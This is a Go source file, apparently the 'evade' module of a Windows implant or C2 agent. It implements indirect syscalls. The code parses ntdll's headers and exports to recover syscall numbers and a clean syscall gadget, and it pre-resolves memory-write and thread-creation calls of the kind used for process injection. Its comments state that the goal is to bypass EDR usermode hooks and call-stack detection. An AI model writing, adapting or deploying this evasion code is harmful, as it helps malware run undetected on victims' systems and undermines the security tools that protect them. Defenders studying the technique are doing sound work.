//go:build windows

package evade

import (
	"errors"
	"syscall"
	"unsafe"
)

// Indirect syscall resolver.
//
// Goal: call kernel APIs without going through the usermode ntdll stubs that
// EDR products hook. Standard syscall sequence:
//
//	mov r10, rcx
//	mov eax, <ssn>          ; syscall service number
//	syscall                 ; jumps to kernel
//	ret
//
// EDR hooks the ntdll stub at the top. If we resolve the SSN ourselves (by
// walking ntdll's export table and reading the mov eax,<ssn> instruction)
// and then execute the syscall from a location the EDR hasn't hooked, we
// bypass the userland hook entirely.
//
// This is the same technique SysWhispers2/3, HellsGate, and TartarusGate
// implement. Ours is a minimal version.

// ssnEntry is a resolved syscall number + the address of a clean `syscall`
// gadget inside ntdll's .text section.
type ssnEntry struct {
	SSN    uint32
	Gadget uintptr
}

var (
	resolvedSSNs    = map[string]ssnEntry{}
	resolvedSSNsMu  = make(chan struct{}, 1)
	ErrNoSyscall    = errors.New("evade: no syscall gadget found")
	ErrUnknownCall  = errors.New("evade: unknown syscall")
)

// resolveGadget finds a `syscall; ret` sequence in ntdll's executable memory.
// Executing the actual syscall instruction from inside ntdll's address range
// defeats call-stack heuristics that flag "syscall from non-ntdll memory".
func resolveGadget() uintptr {
	ntdll, err := syscall.LoadLibrary(ntdllDll)
	if err != nil {
		return 0
	}
	base := uintptr(ntdll)
	// Walk the PE headers to find the .text section
	dos := (*imageDosHeader)(unsafe.Pointer(base))
	if dos.e_magic != 0x5A4D {
		return 0
	}
	nt := (*imageNtHeaders)(unsafe.Pointer(base + uintptr(dos.e_lfanew)))
	sig := nt.Signature
	if sig != 0x00004550 {
		return 0
	}
	section := (*imageSectionHeader)(unsafe.Pointer(
		base + uintptr(dos.e_lfanew) + 4 + uintptr(nt.FileHeader.SizeOfOptionalHeader) +
			uintptr(20), // IMAGE_FILE_HEADER size
	))
	for i := 0; i < int(nt.FileHeader.NumberOfSections); i++ {
		if string(section.Name[:5]) == ".text" {
			start := base + uintptr(section.VirtualAddress)
			end := start + uintptr(section.Misc.VirtualSize)
			for p := start; p+2 < end; p++ {
				// 0x0F 0x05 = syscall ; 0xC3 = ret
				if *(*byte)(unsafe.Pointer(p)) == 0x0F &&
					*(*byte)(unsafe.Pointer(p+1)) == 0x05 &&
					*(*byte)(unsafe.Pointer(p+2)) == 0xC3 {
					return p
				}
			}
		}
		section = (*imageSectionHeader)(unsafe.Add(unsafe.Pointer(section), 40))
	}
	return 0
}

// resolveSSN finds the syscall service number for a given ntdll export.
// Walks the export name table, finds the stub, and scans for the
// `mov eax, <ssn>` = B8 xx xx xx xx instruction.
func resolveSSN(name string) (uint32, error) {
	ntdll, err := syscall.LoadLibrary(ntdllDll)
	if err != nil {
		return 0, err
	}
	base := uintptr(ntdll)
	dos := (*imageDosHeader)(unsafe.Pointer(base))
	nt := (*imageNtHeaders)(unsafe.Pointer(base + uintptr(dos.e_lfanew)))
	exportRVA := nt.OptionalHeader.DataDirectory[0].VirtualAddress
	if exportRVA == 0 {
		return 0, ErrUnknownCall
	}
	exports := (*imageExportDirectory)(unsafe.Pointer(base + uintptr(exportRVA)))
	nameRVA := base + uintptr(exports.AddressOfNames)
	funcRVA := base + uintptr(exports.AddressOfFunctions)
	ordRVA := base + uintptr(exports.AddressOfNameOrdinals)

	for i := uint32(0); i < exports.NumberOfNames; i++ {
		namePtr := base + uintptr(*(*uint32)(unsafe.Pointer(nameRVA + uintptr(i)*4)))
		n := cString(namePtr)
		if n != name {
			continue
		}
		ord := *(*uint16)(unsafe.Pointer(ordRVA + uintptr(i)*2))
		funcAddr := base + uintptr(*(*uint32)(unsafe.Pointer(funcRVA + uintptr(ord)*4)))
		// Scan for mov eax, imm32
		for j := uintptr(0); j < 32; j++ {
			if *(*byte)(unsafe.Pointer(funcAddr + j)) == 0xB8 {
				ssn := *(*uint32)(unsafe.Pointer(funcAddr + j + 1))
				if ssn < 0x2000 {
					return ssn, nil
				}
			}
		}
		return 0, ErrUnknownCall
	}
	return 0, ErrUnknownCall
}

func cString(addr uintptr) string {
	var out []byte
	for i := uintptr(0); i < 512; i++ {
		b := *(*byte)(unsafe.Pointer(addr + i))
		if b == 0 {
			break
		}
		out = append(out, b)
	}
	return string(out)
}

// Windows PE structures (subset). Not using the image/ package because we
// want zero external imports in this file.
type imageDosHeader struct {
	e_magic    uint16
	_          [58]byte
	e_lfanew   int32
}
type imageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}
type imageDataDirectory struct {
	VirtualAddress uint32
	Size           uint32
}
type imageOptionalHeader64 struct {
	Magic                       uint16
	_                           [108]byte
	DataDirectory               [16]imageDataDirectory
}
type imageNtHeaders struct {
	Signature      uint32
	FileHeader     imageFileHeader
	OptionalHeader imageOptionalHeader64
}
type imageSectionHeader struct {
	Name                 [8]byte
	Misc                 struct {
		VirtualSize uint32
	}
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}
type imageExportDirectory struct {
	_                       [12]byte
	AddressOfNames          uint32
	_                       [4]byte
	AddressOfNameOrdinals   uint32
	AddressOfFunctions      uint32
	_                       [8]byte
	NumberOfNames           uint32
}

// InitSyscalls pre-resolves the syscalls the agent is likely to need and
// stores their SSN + a clean syscall gadget.
func InitSyscalls() (int, error) {
	select {
	case resolvedSSNsMu <- struct{}{}:
		defer func() { <-resolvedSSNsMu }()
	default:
	}
	gadget := resolveGadget()
	if gadget == 0 {
		return 0, ErrNoSyscall
	}
	names := []string{
		"NtAllocateVirtualMemory",
		"NtProtectVirtualMemory",
		"NtWriteVirtualMemory",
		"NtCreateThreadEx",
		"NtOpenProcess",
		"NtQuerySystemInformation",
		"NtReadVirtualMemory",
	}
	n := 0
	for _, name := range names {
		ssn, err := resolveSSN(name)
		if err != nil {
			continue
		}
		resolvedSSNs[name] = ssnEntry{SSN: ssn, Gadget: gadget}
		n++
	}
	return n, nil
}

// Count returns the number of syscalls currently resolved.
func Count() int { return len(resolvedSSNs) }
